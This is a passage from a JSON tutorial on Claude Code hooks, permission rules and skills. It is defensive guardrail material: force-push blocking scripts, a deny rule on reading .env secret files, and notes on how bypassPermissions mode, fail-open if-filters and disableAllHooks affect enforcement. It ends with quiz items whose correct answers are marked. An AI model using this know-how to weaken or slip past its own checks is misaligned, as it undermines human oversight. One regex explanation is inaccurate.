variables (`$CLAUDE_PROJECT_DIR`) since the process environment is inherited. In exec form, they are substituted as plain strings in `command`/`args` by Claude Code before spawning.\n\nDo not use absolute paths like `/home/alice/...`; use `${CLAUDE_PROJECT_DIR}` for portability across the team.\n\n### How Hooks Receive Input\n\nCommand hooks receive the JSON event payload on **stdin**. There is no `CLAUDE_HOOK_INPUT` environment variable. Read stdin in your hook scripts:\n\n```bash\n#!/bin/bash\n# Read the JSON payload from stdin\nTOOL_NAME=$(jq -r '.tool_name' < /dev/stdin)\n```\n\nFor HTTP hooks, the JSON payload arrives as the HTTP POST body with `Content-Type: application/json`. A persistent environment variable (`CLAUDE_ENV_FILE`) is available only on specific events (`SessionStart`, `Setup`, `CwdChanged`, `FileChanged`) for persisting state between hook invocations."
   },
   {
    "heading": "Exit Code Blocking Semantics",
    "body": "The exit code a hook returns determines whether it blocks the action, informs Claude, or is ignored — and the exact semantics are counterintuitive for anyone used to Unix conventions where any nonzero = error.\n\n### The Three Tiers (Command Hooks)\n\n| Exit code | Name | Effect |\n|---|---|---|\n| **0** | Success | Hook ran cleanly. Stdout is parsed as JSON for structured output. On context-injecting events (`SessionStart`, `Setup`, `UserPromptSubmit`, `UserPromptExpansion`) stdout text is also injected into Claude's context. |\n| **2** | Blocking error | Stderr is shown to Claude. **The action is blocked** (on blockable events). JSON on stdout is ignored. |\n| **Other nonzero (1, 3–255)** | Non-blocking error | First line of stderr appears in the transcript. Full stderr goes to the debug log. Execution continues. |\n\n### Common Mistake: Exit 1 Is Not Blocking\n\nThe most frequent hook bug is returning `exit 1` expecting to block a tool call. `exit 1` is a *non-blocking* error — Claude sees the first stderr line as a warning, but the tool call proceeds. Only `exit 2` blocks.\n\n```bash\n#!/bin/bash\n# WRONG — exit 1 does not block\nif [[ \"$(jq -r '.tool_name' < /dev/stdin)\" == \"Bash\" ]]; then\n  echo \"Blocked!\" >&2\n  exit 1  # Claude sees the warning but still runs the command\nfi\n\n# CORRECT — exit 2 blocks\nINPUT=$(cat)  # read stdin once into a variable\nTOOL=$(echo \"$INPUT\" | jq -r '.tool_name')\nif [[ \"$TOOL\" == \"Bash\" ]]; then\n  echo \"Blocked by security policy\" >&2\n  exit 2  # Tool call is cancelled; stderr fed back to Claude\nfi\n```\n\n### Blockable vs. Non-Blockable Events\n\nExit code 2 only has blocking effect on *blockable* events. On non-blockable events, exit 2 either produces an error message or is ignored:\n\n- **Blockable:** `PreToolUse`, `UserPromptSubmit`, `UserPromptExpansion`, `Stop`, `SubagentStop`, `PermissionRequest`, `PreCompact`, `ConfigChange`, `PostToolBatch`, `TaskCreated`, `TaskCompleted`, `TeammateIdle`, `WorktreeCreate`, `Elicitation`, `ElicitationResult`\n- **Non-blockable:** `PostToolUse`, `PostToolUseFailure`, `PermissionDenied`, `StopFailure`, `Notification`, `SubagentStart`, `SessionStart`, `Setup`, `SessionEnd`, `CwdChanged`, `FileChanged`, `PostCompact`, `InstructionsLoaded`, `WorktreeRemove`, `MessageDisplay`\n\nNote that `PostToolUse` is **non-blockable** — you cannot cancel a tool call after the fact with a post-use hook. Post-use hooks are for side effects (formatting, logging, metrics), not enforcement. Use `PreToolUse` for enforcement.\n\n### HTTP Hook Response Semantics\n\nHTTP hooks differ from command hooks: the HTTP status code does not control blocking. A non-2xx response is a non-blocking error. To block via an HTTP hook, return **2xx with a JSON body** containing the decision field:\n\n```json\n{\n  \"hookSpecificOutput\": {\n    \"hookEventName\": \"PreToolUse\",\n    \"permissionDecision\": \"deny\",\n    \"permissionDecisionReason\": \"Command matches blocked pattern\"\n  }\n}\n```\n\n### JSON Output for Structured Decisions (Command Hooks)\n\nExit 0 with valid JSON on stdout gives fine-grained control beyond the binary block/allow. For `PreToolUse`:\n\n```json\n{\n  \"hookSpecificOutput\": {\n    \"hookEventName\": \"PreToolUse\",\n    \"permissionDecision\": \"allow|deny|ask|defer\",\n    \"permissionDecisionReason\": \"Why you made this decision\",\n    \"updatedInput\": { \"command\": \"modified command\" },\n    \"additionalContext\": \"Extra info for Claude\"\n  }\n}\n```\n\nTop-level fields available in all hook JSON output include `continue` (set to `false` to stop Claude entirely), `suppressOutput` (hide stdout from transcript), and `systemMessage` (message shown to user).\n\n### Async Hooks\n\nFor hooks that should not slow down the hot path, use `async: true` to run in the background without blocking Claude. For hooks that should run in the background but wake Claude when something notable happens:\n\n```json\n{\n  \"type\": \"command\",\n  \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/file-watcher.sh\",\n  \"asyncRewake\": true\n}\n```\n\n`asyncRewake: true` implies `async: true` and wakes Claude with the hook's stderr (or stdout if stderr is empty) as a system reminder when the hook exits with code 2."
   },
   {
    "heading": "PreToolUse Policy Enforcement",
    "body": "The `PreToolUse` event is the primary enforcement point for policy that must be deterministic and auditable. Understanding its position in the execution order — and its relationship to permission modes — is essential for building trustworthy team guardrails.\n\n### Execution Order\n\nWhen Claude attempts a tool call:\n\n1. **`PreToolUse` hooks fire** and return a `permissionDecision` (allow/deny/ask/defer) or exit with blocking code 2\n2. **Permission rules are evaluated** (deny → ask → allow precedence from all settings layers)\n3. If permitted, the tool call executes\n4. **`PostToolUse` hooks fire** (non-blockable)\n\nA `PreToolUse` hook that exits with code 2 stops the call *before* permission rules are evaluated. This means a blocking hook takes precedence over any allow rule.\n\nConversely, hook decisions do **not bypass permission rules**: if a hook returns `\"allow\"` but a matching deny rule exists in settings, the deny rule still blocks the call. A matching ask rule still prompts even when the hook returned allow. The two systems are additive — a call must pass both the hook layer and the permission rules layer.\n\n### The `bypassPermissions` Mode Gap\n\nThis is the critical policy enforcement point for infrastructure teams. In `bypassPermissions` mode, Claude skips the permission prompt step, but **`PreToolUse` hooks still fire**. This means:\n\n- If a developer runs with `bypassPermissions` as their `defaultMode`, your `PreToolUse` hooks remain active\n- An explicit `ask` rule forces a prompt even in `bypassPermissions` mode\n- The only way to enforce policy users *cannot* bypass, even when running fully autonomously, is a `PreToolUse` hook that exits 2 or returns `permissionDecision: \"deny\"`\n\nTo prevent `bypassPermissions` mode from being used at all, administrators can set `permissions.disableBypassPermissionsMode: \"disable\"` in managed settings.\n\n### Policy Enforcement Pattern\n\nHooks receive the event JSON on **stdin** — read it with `cat` or a stdin-reading approach:\n\n```bash\n#!/bin/bash\n# .claude/hooks/enforce-git-policy.sh\n# Blocks force-pushes regardless of permission mode\n# Input arrives on stdin as JSON\n\nINPUT=$(cat)\nTOOL_NAME=$(echo \"$INPUT\" | jq -r '.tool_name')\nTOOL_CMD=$(echo \"$INPUT\" | jq -r '.tool_input.command // empty')\n\nif [[ \"$TOOL_NAME\" == \"Bash\" ]]; then\n  # Block any force push variant\n  if echo \"$TOOL_CMD\" | grep -qE 'git\\s+push\\s+.*--force|git\\s+push\\s+.*-f\\b'; then\n    echo \"Force push is prohibited by team policy. Open a PR instead.\" >&2\n    exit 2\n  fi\nfi\n\nexit 0\n```\n\n```json\n// .claude/settings.json — committed, enforced for all team members\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/enforce-git-policy.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### What the Hook Receives on Stdin\n\nAll command hooks receive a JSON object on stdin. Tool-use hooks include:\n\n```json\n{\n  \"session_id\": \"abc123\",\n  \"hook_event_name\": \"PreToolUse\",\n  \"tool_name\": \"Bash\",\n  \"tool_input\": { \"command\": \"git push --force origin main\" },\n  \"permission_mode\": \"bypassPermissions\",\n  \"cwd\": \"/home/alice/project\",\n  \"transcript_path\": \"/path/to/transcript.jsonl\",\n  \"effort\": { \"level\": \"medium\" }\n}\n```\n\nThe `permission_mode` field lets a hook adjust behavior based on how autonomously Claude is running — useful for adding extra scrutiny in auto/bypass modes. Read all of this from stdin at the start of your hook script before doing anything else."
   },
   {
    "heading": "Matcher and If-Filter Selection",
    "body": "Two independent narrowing mechanisms determine whether a hook fires on a given event: the **matcher** (which tool or event source) and the **`if` filter** (which tool arguments).\n\n### Matcher Syntax\n\nThe `matcher` field on a matcher group uses one of three syntaxes, distinguished by character content:\n\n| Pattern | Evaluation | Example | Notes |\n|---|---|---|---|\n| Omitted / `\"\"` / `\"*\"` | Match all | Fire on every occurrence | |\n| Letters, digits, `_`, `\\|` only | Exact string or pipe-separated list | `\"Bash\"`, `\"Edit\\|Write\"` | Case-sensitive |\n| Any other character | JavaScript regex | `\"^Notebook\"`, `\"mcp__memory__.*\"` | Full regex |\n\n**MCP tool naming convention:** MCP tools follow the pattern `mcp__<server>__<tool>`. To match all tools from a server, use a regex: `\"mcp__memory__.*\"` (the exact string `\"mcp__memory\"` would match nothing because canonical tool names include the tool suffix).\n\n### Matcher Targets by Event\n\nThe matcher field matches different things depending on the event:\n\n| Events | Matcher target | Example values |\n|---|---|---|\n| `PreToolUse`, `PostToolUse`, `PostToolUseFailure`, `PermissionRequest`, `PermissionDenied` | Tool name | `\"Bash\"`, `\"Edit\\|Write\"`, `\"mcp__github__.*\"` |\n| `SessionStart` | Session source | `\"startup\"`, `\"resume\"`, `\"clear\"`, `\"compact\"` |\n| `Setup` | Trigger flag | `\"init\"`, `\"maintenance\"` |\n| `SessionEnd` | Exit reason | `\"clear\"`, `\"resume\"`, `\"logout\"`, `\"other\"` |\n| `SubagentStart`, `SubagentStop` | Agent type | `\"general-purpose\"`, `\"Explore\"`, custom names |\n| `PreCompact`, `PostCompact` | Compaction trigger | `\"manual\"`, `\"auto\"` |\n| `ConfigChange` | Config source | `\"user_settings\"`, `\"project_settings\"`, `\"policy_settings\"` |\n| `Notification` | Notification type | `\"permission_prompt\"`, `\"auth_success\"`, `\"elicitation_dialog\"` |\n| `FileChanged` | Literal filenames | `\".envrc\\|.env\"` (not regex — pipe-separated literal names) |\n| `StopFailure` | Error type | `\"rate_limit\"`, `\"authentication_failed\"`, `\"billing_error\"` |\n| `InstructionsLoaded` | Load reason | `\"session_start\"`, `\"nested_traversal\"`, `\"path_glob_match\"` |\n| `UserPromptExpansion` | Command name | Your skill/command names |\n| `Elicitation`, `ElicitationResult` | MCP server name | Your configured server names |\n\nSome events do **not** support matchers and always fire for all occurrences: `UserPromptSubmit`, `PostToolBatch`, `Stop`, `CwdChanged`, `WorktreeCreate`, `WorktreeRemove`, `MessageDisplay`.\n\n### The `if` Filter\n\nThe `if` field applies **only to tool events** (`PreToolUse`, `PostToolUse`, `PostToolUseFailure`, `PermissionRequest`, `PermissionDenied`) and provides a second narrowing level using permission rule syntax:\n\n```json\n{\n  \"type\": \"command\",\n  \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/check-secrets.sh\",\n  \"if\": \"Bash(git commit *)\"\n}\n```\n\nThe `if` field accepts a **single** permission rule. It supports the same patterns as `permissions.allow`/`deny`:\n\n- `Bash(git *)` — matches any git command (strips leading `VAR=value` env assignments, checks commands in `$()` and backticks)\n- `Edit(*.ts)` — matches edits to TypeScript files\n- `Bash(npm test && *)` — each subcommand is checked independently\n\n### The Fail-Open Behavior\n\nThis is the most important gotcha with `if` filters: **if the filter fails to parse (e.g., the Bash command is complex syntax the parser doesn't handle), the hook runs anyway**. The filter fails open, not closed. Do not rely on `if` filters as your primary security gate — they are a performance optimization to avoid running unnecessary hooks, not an enforcement mechanism. Use exit-code-2 logic inside your hook script for hard enforcement."
   },
   {
    "heading": "Parallel Hook Execution and Most-Restrictive-Wins Merge",
    "body": "When multiple hooks match the same event, Claude Code runs them concurrently and merges the results. The merge algorithm applies the most restrictive permission decision across all hooks.\n\n### Execution Model\n\nAll hooks matching an event run in parallel. They all complete before Claude Code proceeds (except `async`/`asyncRewake` hooks).\n\n```\nPreToolUse event fires\n  │\n  ├─ Hook A (matcher: \"Bash\"): exits 0, JSON { permissionDecision: \"allow\" }\n  ├─ Hook B (matcher: \"Bash\"): exits 0, JSON { permissionDecision: \"deny\", ... }\n  └─ Hook C (matcher: \"Bash(git *)\" + if filter): exits 0, JSON { ... }\n       Merge: deny > allow → result: DENY\n```\n\n### Permission Decision Precedence\n\nWhen merging parallel hook results:\n\n```\ndeny > defer > ask > allow\n```\n\nA single `deny` from any hook blocks the call, regardless of how many other hooks returned `allow`. This is intentional: you want your security hooks to be composable. A formatting hook that returns `allow` does not cancel out a policy hook that returns `deny`.\n\n### Deduplication\n\nIdentical handlers are deduplicated to prevent duplicate side effects when hooks are merged from multiple sources (e.g., a project hook and a plugin hook that both happen to register the same command):\n\n- **Command hooks:** deduplicated by `command` + `args` string\n- **HTTP hooks:** deduplicated by URL\n\n### Practical Composition Pattern\n\nThe key architecture principle for shared infrastructure: **each hook owns one concern**. Register multiple small hooks rather than one monolithic hook that does everything:\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          { \"type\": \"command\", \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/policy-enforce.sh\" },\n          { \"type\": \"command\", \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/audit-log.sh\", \"async\": true },\n          { \"type\": \"command\", \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/cost-guard.sh\" }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`policy-enforce.sh` and `cost-guard.sh` run in parallel; either can block with exit 2. `audit-log.sh` runs asynchronously (never blocks). When the synchronous ones return, the most restrictive decision wins.\n\n### Inspecting Configured Hooks\n\nType `/permissions` in any session to view active permission rules. To see all active hooks, you can inspect the merged settings. The `/hooks` slash command is not a documented built-in; instead, use `claude doctor` from the CLI to diagnose configuration issues including hooks, or check the merged settings file directly.\n\nTo disable all hooks globally (for debugging), set `\"disableAllHooks\": true` in any settings file — noting that managed hooks cannot be disabled by user or project settings when `allowManagedHooksOnly` is set."
   },
   {
    "heading": "Slash Command Invocation and Availability",
    "body": "Slash commands and skills are the same mechanism. A file at `.claude/commands/deploy.md` and a skill at `.claude/skills/deploy/SKILL.md` both create `/deploy` and work identically. The skills directory supports additional features: supporting files, frontmatter for invocation control, and automatic context loading.\n\n### Invocation Rules\n\nA slash command is invoked by typing `/name` in Claude Code. Claude can also invoke skills automatically when they are relevant to the conversation (unless `disable-model-invocation: true` is set). Providing arguments after the command name passes them as `$ARGUMENTS`:\n\n```\n/deploy staging           → skill \"deploy\", $ARGUMENTS = \"staging\"\n/fix-issue 123            → skill \"fix-issue\", $ARGUMENTS = \"123\"\n```\n\n### Command Name Resolution\n\nThe name you type comes from where the file lives, not the frontmatter `name` field (with one exception — plugin root `SKILL.md`):\n\n| Location | Command name | Example |\n|---|---|---|\n| `.claude/skills/deploy-staging/SKILL.md` | Directory name | `/deploy-staging` |\n| `.claude/commands/deploy.md` | Filename without extension | `/deploy` |\n| Nested `apps/web/.claude/skills/deploy/SKILL.md` (name clashes) | Qualified path | `/apps/web:deploy` |\n| `my-plugin/skills/review/SKILL.md` | Plugin-namespaced | `/my-plugin:review` |\n| Plugin root `SKILL.md` (with `name: review`) | Frontmatter `name`; plugin directory name as fallback | `/my-plugin:review` |\n\nIf a skill directory name and a commands file share the same name, the skill takes precedence. The frontmatter `name` field sets the display label in skill listings but does not change what you type — except for plugin root `SKILL.md` where there is no directory name to fall back on.\n\n### Availability Conditions\n\nA slash command is only available if:\n\n1. The `SKILL.md` or `.md` file exists in a watched directory\n2. The skill is not set to `\"off\"` in `skillOverrides`\n3. For project skills in `.claude/skills/`: the workspace trust dialog has been accepted (if not already trusted)\n4. For plugin skills: the plugin is enabled\n\nBuilt-in commands (`/help`, `/compact`, `/config`, `/model`, `/permissions`, `/cd`, `/add-dir`) are always available. Bundled skills (`/code-review`, `/debug`, `/batch`, `/loop`, `/claude-api`, `/run`, `/verify`, `/run-skill-generator`) are available unless `disableBundledSkills: true` is set.\n\n### Argument Passing\n\nFour argument substitution forms are available inside skill content:\n\n| Placeholder | Expands to |\n|---|---|\n| `$ARGUMENTS` | Full argument string as typed. If absent from skill body, arguments are appended as `ARGUMENTS: <value>` |\n| `$ARGUMENTS[0]`, `$ARGUMENTS[1]`, ... | Zero-indexed positional argument |\n| `$0`, `$1`, ... | Shorthand for positional (`$0` = first arg, `$1` = second) |\n| `$name` (when `arguments:` frontmatter set) | Named positional argument mapping to position order |\n\nMulti-word arguments use shell-style quoting: `/skill \"hello world\" second` makes `$0 = hello world`, `$1 = second`. To include a literal `$` before a digit or `ARGUMENTS`, escape with a backslash: `\\$1.00`.\n\nTwo additional substitutions useful for dynamic content:\n\n| Placeholder | Expands to |\n|---|---|\n| `${CLAUDE_SESSION_ID}` | Current session ID |\n| `${CLAUDE_SKILL_DIR}` | Directory containing the skill's `SKILL.md` file |\n\n### Controlling Who Can Invoke\n\nTwo frontmatter fields gate invocation:\n\n```yaml\n---\n# Only you can invoke this (Claude won't trigger it automatically,\n# and the description is not loaded into context)\ndisable-model-invocation: true\n\n# Claude can invoke this but it's hidden from the / menu\n# (only Claude invokes it, not users typing /name)\nuser-invocable: false\n---\n```\n\n`disable-model-invocation: true` is essential for skills with side effects (deploy, send notifications, modify external state). Without it, Claude might trigger your deploy skill when it decides your code looks ready. Note: `user-invocable: false` only controls menu visibility, not whether Claude can invoke the skill programmatically.\n\n### Dynamic Context Injection\n\nThe `` !`command` `` syntax runs shell commands before the skill content is sent to Claude. The command output replaces the placeholder:\n\n```yaml\n---\nname: pr-review\ndescription: Review the current pull request\ndisable-model-invocation: true\nallowed-tools: Bash(gh pr *) Bash(git diff *)\n---\n\n## PR context\n- Diff: !`gh pr diff`\n- Changed files: !`gh pr diff --name-only`\n- PR description: !`gh pr view`\n\n## Review checklist\n1. Correctness — does the logic match the stated intent?\n2. Tests — are new code paths covered?\n3. Style — does it follow our conventions in CLAUDE.md?\n```\n\nTo disable shell execution in skills from user/project/plugin sources, set `\"disableSkillShellExecution\": true` in settings."
   },
   {
    "heading": "Component-Scoped Hooks in Skills and Agents",
    "body": "Beyond session-wide hooks in `settings.json`, hooks can be scoped to the lifetime of a specific skill or subagent. These component-scoped hooks are declared in the `hooks` frontmatter field and are automatically activated when the component loads and cleaned up when it exits.\n\n### Skill Frontmatter Hook Declaration\n\n```yaml\n---\nname: secure-operations\ndescription: Perform operations requiring elevated security checks\nhooks:\n  PreToolUse:\n    - matcher: \"Bash\"\n      hooks:\n        - type: command\n          command: \"./scripts/security-check.sh\"\n          timeout: 30\n  PostToolUse:\n    - matcher: \"Edit|Write\"\n      hooks:\n        - type: command\n          command: \"${CLAUDE_SKILL_DIR}/scripts/audit.sh\"\n---\n\nProceed with the operation...\n```\n\nThe hook configuration format is identical to `settings.json` hooks. The difference is scope: these hooks are only active while this skill is loaded in the session. Note that `${CLAUDE_SKILL_DIR}` expands to the directory containing the skill's `SKILL.md`, making references to bundled scripts portable across install locations.\n\n### The `once` Field (Skill Frontmatter Only)\n\n```yaml\nhooks:\n  SessionStart:\n    - matcher: \"startup\"\n      hooks:\n        - type: command\n          command: \"${CLAUDE_SKILL_DIR}/setup.sh\"\n          once: true\n```\n\n`once: true` causes the hook to fire exactly once per session, then be automatically removed. It is **only honored in skill frontmatter** — in `settings.json`, it is ignored. This makes it suitable for one-time setup: initializing a database connection, writing an env file, or caching an API token. Without `once`, a `SessionStart` hook would fire on every session resume and compact.\n\n### Subagent Hook Conversion\n\nAgents use identical frontmatter syntax. One automatic conversion applies: a `Stop` hook in an agent's frontmatter is automatically converted to `SubagentStop`, because `Stop` fires when the main session ends while `SubagentStop` fires when a subagent completes. You can write `Stop` in your agent frontmatter and it does the right thing for the agent context.\n\n### Lifecycle Scoping in Practice\n\nThe scoping behavior has important implications for team tooling:\n\n- **Skills**: hooks are active while the skill content is loaded in the conversation context. Invoked skills stay in context after compaction (within the 25,000-token skill budget), so their hooks remain active.\n- **Subagents (`context: fork`)**: hooks are active during the subagent's execution and cleaned up on exit. They cannot outlive the subagent.\n\nThis makes component-scoped hooks the right tool for capability-specific concerns: a `secure-operations` skill that registers its own `PreToolUse` policy hook, a `db-migration` skill that logs every file write. The hooks are self-contained with the skill and don't pollute the session-wide hook set when the skill isn't active.\n\n### Plugin-Distributed Hooks\n\nPlugins distribute hooks via a `hooks/hooks.json` file inside the plugin package:\n\n```json\n{\n  \"description\": \"Auto-format on every write\",\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/format.sh\",\n            \"args\": [],\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nPlugin hooks merge with user and project hooks when the plugin is enabled. If `allowManagedHooksOnly: true` is set in managed settings, only hooks from force-enabled plugins (also in managed settings' `enabledPlugins`) are loaded; all other plugin hooks and user/project hooks are blocked."
   },
   {
    "heading": "When to Use What: A Decision Framework",
    "body": "The configuration surface is wide. This section maps common team infrastructure goals to the right mechanism.\n\n### Config File Choice\n\n| Goal | Mechanism | Why |\n|---|---|---|\n| Enforce policy for all devs | `.claude/settings.json` (committed) + hooks with exit 2 | Cannot be gitignored away |\n| Enforce policy that survives `bypassPermissions` | `PreToolUse` hook in `.claude/settings.json` | Hooks fire before permission-mode check |\n| Organization-wide policy (multi-repo) | Managed settings via `/etc/claude-code/managed-settings.json` | Cannot be overridden at any lower layer |\n| Prevent `bypassPermissions` mode entirely | `permissions.disableBypassPermissionsMode: \"disable\"` in managed settings | Managed-only setting |\n| Personal model preference | `~/.claude/settings.json` | Doesn't impose on teammates |\n| Experiment with a hook locally | `.claude/settings.local.json` | Gitignored, project-scoped |\n| Reusable workflow across all projects | `~/.claude/skills/<name>/SKILL.md` | Personal, not committed |\n| Team-standard workflow | `.claude/skills/<name>/SKILL.md` (committed) | All devs get it via git clone |\n\n### Hook Type Choice\n\n| Need | Hook type | Notes |\n|---|---|---|\n| Block a tool call | `PreToolUse`, exit 2 | Only blockable event before tool runs |\n| Log every file write | `PostToolUse`, `async: true` | Non-blocking; don't slow the hot path |\n| Auto-format after edits | `PostToolUse` on `Write\\|Edit` | Can run format-in-place |\n| Inject context at session start | `SessionStart`, stdout → Claude's context | stdout shown to Claude on this event |\n| Validate before commit | `PreToolUse` on `Bash` with `if: \"Bash(git commit *)\"` filter | Check staged files before commit |\n| Audit log to external system | `http` hook, `async: true` | Fire-and-forget to logging endpoint; return 2xx to succeed |\n| Watch for env file changes | `FileChanged`, matcher `\".env\\|\\.envrc\"` | Literal pipe-separated names on FileChanged |\n| Background check that wakes Claude | `command` hook, `asyncRewake: true` | Exits 2 when it needs Claude's attention |\n\n### Common Pitfalls\n\n**Exit 1 is not blocking.** Only `exit 2` blocks on blockable events. `exit 1` logs a non-blocking warning and execution continues.\n\n**Hooks receive input on stdin, not in an environment variable.** Read from stdin (`cat` or `jq < /dev/stdin`) — there is no `CLAUDE_HOOK_INPUT` env var.\n\n**Regex matchers are JavaScript regex, not bash glob.** `\"Bash*\"` is not `\"Bash.*\"`. The former matches \"Bash\" followed by zero or more \"H\" characters; the latter matches any string starting with \"Bash\".\n\n**`if` filter fails open.** A hook with `\"if\": \"Bash(complex || pattern)\"` that fails to parse will fire anyway, not skip. Do not rely on `if` for security gating.\n\n**`PostToolUse` cannot cancel the tool.** If you need to enforce something, it must be `PreToolUse`. `PostToolUse` is for side effects only.\n\n**HTTP hooks can't block via status code.** Return 2xx with a JSON body containing `permissionDecision: \"deny\"` to block from an HTTP hook. A non-2xx response is treated as a non-blocking error.\n\n**Hardcoded paths break on other machines.** Always use `${CLAUDE_PROJECT_DIR}` for project-relative paths in committed hooks.\n\n**Event names are case-sensitive.** `preToolUse` and `PreTooluse` are both silently ignored. The canonical form is `PreToolUse`.\n\n**Absolute paths in permission rules use `//` prefix.** `Read(/src/**)` means relative to the project root. For absolute paths, use `Read(//path/to/file)`. Home-relative paths use `Read(~/path)`."
   },
   {
    "heading": "Full Worked Example: Team Infrastructure Setup",
    "body": "This example shows a realistic `.claude/` directory for a shared Node.js repo with two enforcement goals: block force pushes, and auto-format TypeScript files after every write.\n\n### Directory Layout\n\n```\n.claude/\n├── settings.json          # committed — team policy + hooks\n├── settings.local.json    # gitignored — personal overrides (not committed)\n├── hooks/\n│   ├── enforce-git.sh     # blocks force push, committed\n│   └── format.sh          # runs prettier, committed\n└── skills/\n    └── pr-review/\n        └── SKILL.md       # /pr-review skill, committed\n```\n\n### `.claude/settings.json` (committed)\n\n```json\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run *)\",\n      \"Bash(git status)\",\n      \"Bash(git log *)\",\n      \"Bash(git diff *)\",\n      \"Bash(git add *)\",\n      \"Bash(git commit *)\",\n      \"Bash(git checkout *)\",\n      \"Bash(git push origin HEAD)\"\n    ],\n    \"deny\": [\n      \"Bash(git push --force *)\",\n      \"Bash(git push -f *)\",\n      \"Read(./.env)\",\n      \"Read(./.env.*)\"\n    ]\n  },\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/enforce-git.sh\"\n          }\n        ]\n      }\n    ],\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Edit|Write\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/format.sh\",\n            \"if\": \"Edit(*.ts)\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### `.claude/hooks/enforce-git.sh`\n\n```bash\n#!/bin/bash\n# Blocks force push even in bypassPermissions mode.\n# Input arrives on stdin as JSON — read it with cat/jq.\n# Exit 2 = blocking; stderr shown to Claude.\n\nINPUT=$(cat)\nCMD=$(echo \"$INPUT\" | jq -r '.tool_input.command // empty')\n\nif echo \"$CMD\" | grep -qE 'git push.*(--force|-f)\\b'; then\n  echo \"Force push is prohibited. Use a non-destructive push or open a PR.\" >&2\n  exit 2\nfi\n\nexit 0\n```\n\n### `.claude/hooks/format.sh`\n\n```bash\n#!/bin/bash\n# Runs prettier on the file that was just written.\n# PostToolUse is non-blockable; formatting failure is non-blocking (exit 1).\n# Input arrives on stdin as JSON.\n\nINPUT=$(cat)\nFILE=$(echo \"$INPUT\" | jq -r '.tool_input.file_path // empty')\n\nif [[ -n \"$FILE\" && \"$FILE\" == *.ts ]]; then\n  npx prettier --write \"$FILE\" 2>/dev/null || {\n    echo \"prettier failed on $FILE\" >&2\n    exit 1  # non-blocking — logs to transcript but doesn't cancel\n  }\nfi\n\nexit 0\n```\n\n### `.claude/skills/pr-review/SKILL.md`\n\n```yaml\n---\nname: PR Review\ndescription: Review a pull request for correctness, test coverage, and style. Use when asked to review a PR, check a diff, or audit changes.\ndisable-model-invocation: true\nallowed-tools: Bash(gh pr *) Bash(git diff *)\n---\n\n## PR context\n\n- Diff: !`gh pr diff`\n- Changed files: !`gh pr diff --name-only`\n- PR description: !`gh pr view`\n\n## Review checklist\n\n1. Correctness — does the logic match the stated intent?\n2. Tests — are new code paths covered?\n3. Style — does it follow our conventions in CLAUDE.md?\n4. Breaking changes — any API or schema changes without migration?\n\nProvide a summary with LGTM / Request Changes recommendation.\n```\n\n### What Each Piece Does\n\n- **`permissions.deny`** catches force push at the permission-rule layer (Claude is told it can't even attempt it).\n- **`enforce-git.sh` PreToolUse hook** catches it a second time at the hook layer, including when running in `bypassPermissions` mode where the permission dialog is skipped. Both layers read the tool input JSON from stdin.\n- **`format.sh` PostToolUse hook** runs prettier after every TypeScript write. The `if: \"Edit(*.ts)\"` filter on the handler avoids running it on non-TypeScript files. Since `PostToolUse` is non-blockable, a prettier failure returns exit 1 (non-blocking log) instead of exit 2.\n- **`/pr-review` skill** is user-invocable only (`disable-model-invocation: true`) because it calls `gh` and you want to control when it runs. The `!\\`` shell injection lines execute before Claude sees the skill, so Claude always has the live diff. The `allowed-tools` field pre-approves `gh pr` and `git diff` calls so Claude isn't prompted mid-review.\n\nA new developer who clones this repo and runs `claude` immediately gets all of these — they don't need to configure anything."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team commits a `PreToolUse` hook to `.claude/settings.json` that blocks destructive Bash commands. A developer adds a personal rule to `~/.claude/settings.json` that disables the same hook. When the developer runs Claude Code, which setting wins?",
    "options": [
     "The project `.claude/settings.json` wins because project config always overrides user config.",
     "The `~/.claude/settings.json` wins because user config overrides project config.",
     "The managed policy settings win if they exist; otherwise the local settings file `.claude/settings.local.json` is authoritative.",
     "The two configs are merged; conflicting values produce an error that Claude reports at startup."
    ],
    "correct": 0,
    "sectionIndices": [
     1
    ],
    "explanation": "Settings resolve in ascending order: user → project → local → managed policy. Project `.claude/settings.json` overrides the user-level `~/.claude/settings.json`, so the team hook committed to the project file takes precedence."
   },
   {
    "prompt": "A developer wants to experiment with a new hook that only applies to their own machine, not the team. They have three candidate files: `~/.claude/settings.json`, `.claude/settings.json`, and `.claude/settings.local.json`. Which file should they write it to, and why?",
    "options": [
     "`.claude/settings.json` — it is the highest-precedence non-admin file and will override user config.",
     "`.claude/settings.local.json` — it is gitignored, so it won't impose the experiment on the rest of the team.",
     "`~/.claude/settings.json` — user-level config is the correct place for anything that should not be committed.",
     "Either `~/.claude/settings.json` or `.claude/settings.local.json` are equivalent choices because both are personal and not committed."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "`.claude/settings.local.json` is gitignored by convention and is the correct home for personal/experimental project-scoped overrides. `~/.claude/settings.json` would apply to all projects, not just this one."
   },
   {
